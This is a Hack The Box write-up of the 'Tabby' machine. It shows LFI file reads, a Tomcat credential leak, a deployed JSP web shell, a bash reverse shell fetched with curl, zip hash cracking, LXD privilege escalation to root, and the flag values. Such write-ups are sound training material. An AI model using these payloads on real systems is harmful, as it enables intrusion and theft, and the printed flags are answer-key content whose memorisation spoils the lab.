---
title: "Tabby from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Tabby from HTB

`nmap` Gave this:
```bash
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp  open     http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
```
First access the `80` port with `IP` and after clicking things we find this redirect link, so we have to add this to `/etc/hosts`
```
10.10.10.194 megahosting.htb
```
The URL is like this
```
http://megahosting.htb/news.php?file=statement
```
Which indicates that there may be possible to do `LFI`, that means we can read another files like `/etc/passwd`, so we have to try ways
I guess the file `statement` will be located in `/var/www/html` or one directory above.
Trying `../../../etc/passwd` gave nothing so lets do going back 4 directories `../../../../etc/passwd`
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bash
```
So we can read files now.
Now access the `8080` PORT
accessing [http://10.10.10.194:8080/manager/html] it tells us to authorize and clicking `cancel` tells us this
```
You are not authorized to view this page. If you have not changed any configuration files, please examine the file conf/tomcat-users.xml in your installation. That file must contain the credentials to let you use this webapp.

```
Searching `tomcat9` directories we find this `usr/share/tomcat9/etc/tomcat-users.xml` now reading that gave us things
```
<role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>

```
>tomcat
>$3cureP4s5w0rd123!

Using this credentials we can't access that same page.
So let's search for directories in `/manager` directory.
```bash
wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://10.10.10.194:8080/manager/FUZZ


000000001:   302        0 L      0 W        0 Ch        "http://10.10.10.194:8080
                                                        /manager/"
000001939:   401        63 L     291 W      2499 Ch     "html"
000001991:   302        0 L      0 W        0 Ch        "images"
000003850:   401        63 L     291 W      2499 Ch     "status"
000004024:   401        63 L     291 W      2499 Ch     "text"
```
Nothing unusual except `text` searching that shows that commands can be executed from this directory.
```
The following commands are supported:

  list
  add
  remove
  start
  stop
  persist
  deploy
```
we will need to deploy an `cmd` to `tomcat9` which should be `.jsp`.
```bash
git clone https://github.com/tennc/webshell.git
cd /webshell/jsp
```
We'll use `cmdjsp.jsp` but just know you have to remove `cmd.exe /C` because it's a Linux machine, change the `METHOD` to `POST`, and probably the name if you want.
should look like this
```java
// note that linux = cmd and windows = "cmd.exe /c + cmd"

<FORM METHOD=POST ACTION='cmdjsp.jsp'>
<INPUT name='help' type=text>
<INPUT type=submit value='Run'>
</FORM>

<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("help");
   String output = "";

   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) {
            output += s;
         }
      }
      catch(IOException e) {
         e.printStackTrace();
      }
   }
%>

<pre>
<%=output %>
</pre>
```
now to upload the file we will need `curl`
```bash
curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/app -T cmd.war
OK - Deployed application at context path [/app]
```
now to find the uploaded file and to run commands go to this [http://10.10.10.194:8080/app/cmdjsp.jsp]
Run the command like `id` and if it doesn't work you have to change something.
To get reverse shell you need to create an reverse shell script
```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.16.11/4444 0>&1'
```
Then start an `python3 simple server`
```python
python3 -m http.server 80
```
and with `curl` from machine take that `reverse shell script` put it to a file and then execute it.
```bash
curl 10.10.16.11:80/reverse.sh -o /dev/shm/reverse.sh
bash /dev/shm/reverse.sh
```
This will get you a connection on `netcat`
```bash
rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.10.194] 46504
bash: cannot set terminal process group (985): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@tabby:/var/lib/tomcat9$
```
we find `.zip` file in `/var/www/html/files` so let's check it.
```bash
tomcat@tabby:/var/www/html/files$ ls
ls
16162020_backup.zip  archive  revoked_certs  statement
```
to forward it to machine without wasting time just `base64` encode the `.zip` file, copy it, paste it into some file in your machine, decode it and forward it to `backup.zip`
```bash
base64 -d backup.b64 > backup.zip

unzip backup.zip
Archive:  backup.zip
   creating: var/www/html/assets/
[backup.zip] var/www/html/favicon.ico password:
```
It needs some password we don't know. So let's use `zip2john` to get the hash and then crack it.
```bash
zip2john backup.zip > hash
john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (backup.zip)
1g 0:00:00:01 DONE (2024-09-09 19:01) 0.7575g/s 7856Kp/s 7856Kc/s 7856KC/s adornadis..adamsapple:)1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
So the password is
 admin@it
Exploring the `.zip` file there is nothing interesting. We can use this password to try to login as `ash` and it works!
User Flag is:
```
fa4cbf19892c8bbb002e9042a35b333a
```
now for privilege escalation
```bash
ash@tabby:~$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```
Searching all that only with `lxd` we are able to do privilege escalation
I will be using this ![hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
and also ![hackingarticles](https://www.hackingarticles.in/lxd-privilege-escalation/)
Only one didn't work for me so i combined them and got root shell
```bash
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
python -m http.server 80
```
Now on machine
```bash
cd /tmp
wget 10.10.16.11/alpine-v3.20-x86_64-20240909_2042.tar.gz
lxc image import ./alpine-v3.20-x86_64-20240909_2042.tar.gz --alias myimage
ash@tabby:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
| myimage | 05ec247da965 | no     | alpine v3.20 (20240909_20:42) | x86_64       | CONTAINER | 3.68MB | Sep 9, 2024 at 4:47pm (UTC) |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+
```

```bash
$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]:
Do you want to configure a new storage pool? (yes/no) [default=yes]:
Name of the new storage pool [default=default]: ignite
Name of the storage backend to use (dir, lvm, zfs, ceph, btrfs) [default=zfs]:
Create a new ZFS pool? (yes/no) [default=yes]:
Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]:
Size in GB of the new loop device (1GB minimum) [default=5GB]:
Would you like to connect to a MAAS server? (yes/no) [default=no]:
Would you like to create a new local network bridge? (yes/no) [default=yes]:
What should the new bridge be called? [default=lxdbr0]:
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: none
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: none
Would you like the LXD server to be available over the network? (yes/no) [default=no]: no
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] no
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:

$ lxc init myimage ignite -c security.privileged=true
Creating ignite

$ lxc config device add ignite host-root disk source=/ path=/mnt/root recursive=true
$ lxc start ignite
$ lxc exec ignite /bin/sh
~# cd /mnt/root/root
/mnt/root/root # ls
root.txt  snap
```
Root Flag is:
```
c2c3a98668aa4a106e8db9eff38adde9
```
![](/assets/images/2024-09-09_21-02-30.png)

